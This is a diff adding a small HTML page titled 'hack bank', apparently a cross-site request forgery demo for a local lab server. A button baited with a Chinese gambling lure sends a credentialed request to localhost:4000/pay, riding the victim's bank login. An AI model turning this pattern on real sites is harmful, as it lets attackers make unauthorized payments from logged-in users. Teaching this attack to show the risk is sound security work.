@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>hack bank</title>
+</head>
+<body>
+  <p>hack bank</p>
+  <p>假设你刚刚在bank登陆了,然后点击了下面这个按钮......</p>
+  <button onclick="pay()">点击进入:美女荷官,在线发牌!</button>
+</body>
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script type="text/javascript">
+  const base = 'http://localhost:4000'
+  function pay() {
+    axios({
+      withCredentials: true,
+      baseURL: base,
+      url: '/pay'
+    }).then(res => {
+      alert(res.data && res.data.message)
+    })
+  }
+</script>
+</html>
